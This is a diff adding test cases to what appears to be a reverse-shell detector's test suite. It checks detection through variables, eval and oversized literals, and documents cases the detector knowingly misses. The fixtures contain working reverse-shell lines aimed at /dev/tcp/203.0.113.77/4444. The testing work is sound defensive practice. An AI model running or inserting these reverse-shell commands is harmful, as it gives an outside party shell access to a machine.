@@ -169,3 +169,23 @@ def test_many_lines_each_running_a_large_stored_value_stay_fast():
     src2 = f'C="{_PAY} ; {"x" * 15_000}"\n' + 'eval "$C"\n' * 20_000
     hits, cpu = _timed(src2)
     assert len(hits) == 20_000 and cpu < 5.0, cpu
+
+
+def test_a_stored_literal_that_opens_an_fd_leaves_it_open_inlined_and_spilled():
+    opener = "exec 3<>/dev/tcp/203.0.113.77/4444"
+    use = "sh <&3 >&3 2>&3"
+    assert _hits(f"{opener}\n{use}\n") == [2]  # inline control
+    assert _hits(f'C="{opener}"\neval "$C"\n{use}\n') == [3]  # inlined
+    big = opener + " ; " + "x" * 40_000  # past the inlining budget -> judged through the literal
+    assert _hits(f'C="{big}"\neval "$C"\n{use}\n') == [3]  # spilled
+    # a second run of the same spilled literal (memo hit) leaves the same fd state behind
+    assert _hits(f'C="{big}"\neval "$C"\neval "$C"\n{use}\n') == [4]
+    # never run -> the fd is never opened
+    assert _hits(f'C="{big}"\necho "$C"\n{use}\n') == []
+
+
+def test_a_command_name_held_in_a_variable_is_still_the_declared_ceiling():
+    # C-630 ceiling (4), unchanged by B-1062: only the whole payload is resolved, not a
+    # command name that is known at run time
+    assert _hits('C="bash -i"\n$C >& /dev/tcp/203.0.113.77/4444 0>&1\n') == []
+    assert _hits('C="bash -i"\neval "$C >& /dev/tcp/203.0.113.77/4444 0>&1"\n') == []
